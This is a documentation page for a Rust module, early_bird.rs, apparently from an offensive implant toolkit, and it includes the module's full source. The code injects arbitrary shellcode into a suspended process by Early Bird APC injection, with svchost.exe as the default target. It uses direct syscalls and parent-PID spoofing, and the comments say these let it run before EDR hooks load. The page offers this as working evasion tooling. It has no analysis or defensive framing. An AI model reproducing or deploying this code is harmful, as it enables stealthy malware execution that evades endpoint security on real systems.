# crowd — early_bird.rs  (🔥 S TIER — upgraded from A: full RecycledGate syscalls)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/early_bird.rs` |
| **Lines** | 276 |
| **Tier** | U |
| **Cards** | T007-process-injection |
| **Role** | Early Bird APC injection |
| **Unsafe blocks** | 3 |

## Purpose

# crowd — early_bird.rs  (🔥 S TIER — upgraded from A: full RecycledGate syscalls)

## Early Bird APC Injection (OPSEC 9.0)

Injects shellcode via `QueueUserAPC` in a process before its entry
point executes — specifically during the alertable wait that occurs
during process initialization.  This means the payload runs **before**
any EDR hooks or DLL instrumentation are applied.

Sequence:
1. `CreateProcess(CREATE_SUSPENDED)` — target process is created but
its main thread hasn't started yet
2. `VirtualAllocEx` + `WriteProcessMemory` — inject shellcode
3. `QueueUserAPC(shellcode_addr, main_thread)` — queue the APC
4. `ResumeThread` — the thread wakes up, services the APC (our shellcode)
before reaching the PE entry point

This is the closest available implementation to "Early Cascade Injection"
(Outflank's Shim Engine abuse).  While not identical, the OPSEC effect
is the same: code execution before EDR initialization.

## Constants

- `CREATE_SUSPENDED`: `u32` = `0x00000004`

## Types

### struct `PBI` (line 196)

## Public API

### `early_bird_inject` (line 43)
```rust
pub fn early_bird_inject(target_exe: &str, shellcode: &[u8]) -> Result<u32, String>
```
Injects shellcode via Early Bird APC into a newly created suspended process.

# Arguments
* `target_exe` — Path to the target executable
* `shellcode`  — The payload to inject

# Returns
`Ok(pid)` on success, `Err` on failure.

### `early_bird_default` (line 176)
```rust
pub fn early_bird_default(shellcode: &[u8]) -> Result<u32, String>
```
Default target: creates a suspended `svchost.exe` and injects.

### `early_bird_with_ppid` (line 182)
```rust
pub fn early_bird_with_ppid(
```
Variant using crowd's PPID spoof: creates a suspended process with
spoofed parent PID, then injects via Early Bird APC.

## Key Dependencies

- `use crate::mega_dbg;`

## Full Source

```rust
//! # crowd — early_bird.rs  (🔥 S TIER — upgraded from A: full RecycledGate syscalls)
//!
//! ## Early Bird APC Injection (OPSEC 9.0)
//!
//! Injects shellcode via `QueueUserAPC` in a process before its entry
//! point executes — specifically during the alertable wait that occurs
//! during process initialization.  This means the payload runs **before**
//! any EDR hooks or DLL instrumentation are applied.
//!
//! Sequence:
//! 1. `CreateProcess(CREATE_SUSPENDED)` — target process is created but
//!    its main thread hasn't started yet
//! 2. `VirtualAllocEx` + `WriteProcessMemory` — inject shellcode
//! 3. `QueueUserAPC(shellcode_addr, main_thread)` — queue the APC
//! 4. `ResumeThread` — the thread wakes up, services the APC (our shellcode)
//!    before reaching the PE entry point
//!
//! This is the closest available implementation to "Early Cascade Injection"
//! (Outflank's Shim Engine abuse).  While not identical, the OPSEC effect
//! is the same: code execution before EDR initialization.

#![allow(dead_code, non_snake_case)]

use std::ffi::c_void;
use std::ptr::null_mut;
#[allow(unused_imports)]
use crate::mega_dbg;

// ── Constants ─────────────────────────────────────────────────────────────

const CREATE_SUSPENDED: u32 = 0x00000004;

// ── Public API ────────────────────────────────────────────────────────────

/// Injects shellcode via Early Bird APC into a newly created suspended process.
///
/// # Arguments
/// * `target_exe` — Path to the target executable
/// * `shellcode`  — The payload to inject
///
/// # Returns
/// `Ok(pid)` on success, `Err` on failure.
pub fn early_bird_inject(target_exe: &str, shellcode: &[u8]) -> Result<u32, String> {
    mega_dbg!("EarlyBird: creating '{}' CREATE_SUSPENDED", target_exe);

    unsafe {
        // 1. Create target process in suspended state
        let mut si: winapi::um::processthreadsapi::STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOW>() as u32;

        let mut pi: winapi::um::processthreadsapi::PROCESS_INFORMATION = std::mem::zeroed();

        let mut path_wide: Vec<u16> = target_exe
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let ok = winapi::um::processthreadsapi::CreateProcessW(
            null_mut(),
            path_wide.as_mut_ptr(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        );

        if ok == 0 {
            return Err(format!("EarlyBird: CreateProcessW('{}') failed", target_exe));
        }

        mega_dbg!("EarlyBird: PID={} TID={} — suspended", pi.dwProcessId, pi.dwThreadId);

        // ── RecycledGate syscall path for injection steps ──
        let h_proc_raw = pi.hProcess as usize;
        let h_thread_raw = pi.hThread as usize;

        // 2. Allocate memory in target (RW initially) via NtAllocateVirtualMemory
        let mut remote_addr: *mut c_void = null_mut();
        let mut region_size = shellcode.len();
        let status = crate::recycled::nt_allocate_virtual_memory(
            h_proc_raw,
            &mut remote_addr,
            0,
            &mut region_size,
            0x00003000, // MEM_COMMIT | MEM_RESERVE
            0x04,       // PAGE_READWRITE
        );

        if status < 0 || remote_addr.is_null() {
            crate::recycled::nt_terminate_process(h_proc_raw, 1);
            crate::recycled::nt_close(h_thread_raw);
            crate::recycled::nt_close(h_proc_raw);
            return Err(format!("EarlyBird: NtAllocateVirtualMemory failed (0x{:08x})", status as u32));
        }

        mega_dbg!("EarlyBird: allocated {}B at {:p}", shellcode.len(), remote_addr);

        // 3. Write shellcode via NtWriteVirtualMemory
        let mut written: usize = 0;
        let status = crate::recycled::nt_write_virtual_memory(
            h_proc_raw,
            remote_addr,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            &mut written,
        );

        if status < 0 {
            let mut base = remote_addr;
            let mut sz: usize = 0;
            crate::recycled::nt_free_virtual_memory(h_proc_raw, &mut base, &mut sz, 0x8000);
            crate::recycled::nt_terminate_process(h_proc_raw, 1);
            crate::recycled::nt_close(h_thread_raw);
            crate::recycled::nt_close(h_proc_raw);
            return Err(format!("EarlyBird: NtWriteVirtualMemory failed (0x{:08x})", status as u32));
        }

        // 4. Change protection to RX via NtProtectVirtualMemory
        let mut base_prot = remote_addr;
        let mut prot_size = shellcode.len();
        let mut old_protect: u32 = 0;
        let status = crate::recycled::nt_protect_virtual_memory(
            h_proc_raw,
            &mut base_prot,
            &mut prot_size,
            0x20, // PAGE_EXECUTE_READ
            &mut old_protect,
        );

        if status < 0 {
            mega_dbg!("EarlyBird: NtProtectVirtualMemory RX failed (0x{:08x}) — continuing", status as u32);
        }

        mega_dbg!("EarlyBird: shellcode written — queuing APC via syscall");

        // 5. Queue APC via NtQueueApcThread (RecycledGate syscall)
        let status = crate::recycled::nt_queue_apc_thread(
            h_thread_raw,
            remote_addr as *mut c_void,  // APC routine = shellcode address
            null_mut(),
            null_mut(),
            0,
        );

        if status < 0 {
            let mut base = remote_addr;
            let mut sz: usize = 0;
            crate::recycled::nt_free_virtual_memory(h_proc_raw, &mut base, &mut sz, 0x8000);
            crate::recycled::nt_terminate_process(h_proc_raw, 1);
            crate::recycled::nt_close(h_thread_raw);
            crate::recycled::nt_close(h_proc_raw);
            return Err(format!("EarlyBird: NtQueueApcThread failed (0x{:08x})", status as u32));
        }

        mega_dbg!("EarlyBird: APC queued via syscall — resuming thread");

        // 6. Resume the main thread via NtResumeThread — APC fires before PE entry point
        crate::recycled::nt_resume_thread(h_thread_raw, std::ptr::null_mut());

        let pid = pi.dwProcessId;

        // Cleanup handles
        crate::recycled::nt_close(h_thread_raw);
        crate::recycled::nt_close(h_proc_raw);

        mega_dbg!("EarlyBird: injection complete — PID={}", pid);
        Ok(pid)
    }
}

/// Default target: creates a suspended `svchost.exe` and injects.
pub fn early_bird_default(shellcode: &[u8]) -> Result<u32, String> {
    early_bird_inject(r"C:\Windows\System32\svchost.exe", shellcode)
}

/// Variant using crowd's PPID spoof: creates a suspended process with
/// spoofed parent PID, then injects via Early Bird APC.
pub fn early_bird_with_ppid(
    target_exe: &str,
    shellcode: &[u8],
    parent_pid: u32,
) -> Result<u32, String> {
    mega_dbg!("EarlyBird+PPID: spoofing parent PID={}", parent_pid);

    // Use crowd's ppid module for the process creation
    let (h_proc, h_thread) = crate::ppid::spawn_with_ppid_spoof(target_exe, parent_pid, true)
        .map_err(|e| format!("EarlyBird+PPID: spawn failed — {}", e))?;

    // NtQueryInformationProcess → PID (no Win32 GetProcessId)
    let pid = unsafe {
        #[repr(C)]
        struct PBI { _pad: [usize; 4], unique_pid: usize, _inh: usize }
        let mut pbi: PBI = std::mem::zeroed();
        let mut ret_len: u32 = 0;
        let st = crate::recycled::nt_query_information_process(
            h_proc as usize, 0,
            &mut pbi as *mut PBI as *mut u8,
            std::mem::size_of::<PBI>() as u32, &mut ret_len,
        );
        if st == 0 { pbi.unique_pid as u32 } else { 0u32 }
    };

    mega_dbg!("EarlyBird+PPID: PID={} with parent={} — injecting", pid, parent_pid);

    unsafe {
        let h_proc_raw = h_proc as usize;
        let h_thread_raw = h_thread as usize;

        // Allocate via NtAllocateVirtualMemory
        let mut remote_addr: *mut c_void = null_mut();
        let mut region_size = shellcode.len();
        let status = crate::recycled::nt_allocate_virtual_memory(
            h_proc_raw, &mut remote_addr, 0, &mut region_size,
            0x00003000, 0x04, // MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE
        );

        if status < 0 || remote_addr.is_null() {
            crate::recycled::nt_close(h_thread_raw);
            crate::recycled::nt_close(h_proc_raw);
            return Err(format!("EarlyBird+PPID: NtAllocateVirtualMemory failed (0x{:08x})", status as u32));
        }

        // Write via NtWriteVirtualMemory
        let mut written: usize = 0;
        let status = crate::recycled::nt_write_virtual_memory(
            h_proc_raw, remote_addr,
            shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written,
        );
        if status < 0 {
            crate::recycled::nt_close(h_thread_raw);
            crate::recycled::nt_close(h_proc_raw);
            return Err(format!("EarlyBird+PPID: NtWriteVirtualMemory failed (0x{:08x})", status as u32));
        }

        // Protect RW → RX via NtProtectVirtualMemory
        let mut base_p = remote_addr;
        let mut sz_p = shellcode.len();
        let mut old_p: u32 = 0;
        crate::recycled::nt_protect_virtual_memory(
            h_proc_raw, &mut base_p, &mut sz_p, 0x20, &mut old_p,
        );

        // Queue APC via NtQueueApcThread — check NTSTATUS to avoid zombies
        let status = crate::recycled::nt_queue_apc_thread(
            h_thread_raw, remote_addr as *mut c_void, null_mut(), null_mut(), 0,
        );
        if status < 0 {
            let mut base = remote_addr;
            let mut sz: usize = 0;
            crate::recycled::nt_free_virtual_memory(h_proc_raw, &mut base, &mut sz, 0x8000);
            crate::recycled::nt_terminate_process(h_proc_raw, 1);
            crate::recycled::nt_close(h_thread_raw);
            crate::recycled::nt_close(h_proc_raw);
            return Err(format!("EarlyBird+PPID: NtQueueApcThread failed (0x{:08x})", status as u32));
        }

        // Resume via NtResumeThread — check NTSTATUS to avoid zombies
        let status = crate::recycled::nt_resume_thread(h_thread_raw, std::ptr::null_mut());
        if status < 0 {
            crate::recycled::nt_terminate_process(h_proc_raw, 1);
            crate::recycled::nt_close(h_thread_raw);
            crate::recycled::nt_close(h_proc_raw);
            return Err(format!("EarlyBird+PPID: NtResumeThread failed (0x{:08x})", status as u32));
        }

        crate::recycled::nt_close(h_thread_raw);
        crate::recycled::nt_close(h_proc_raw);
    }

    mega_dbg!("EarlyBird+PPID: complete — PID={}", pid);
    Ok(pid)
}

```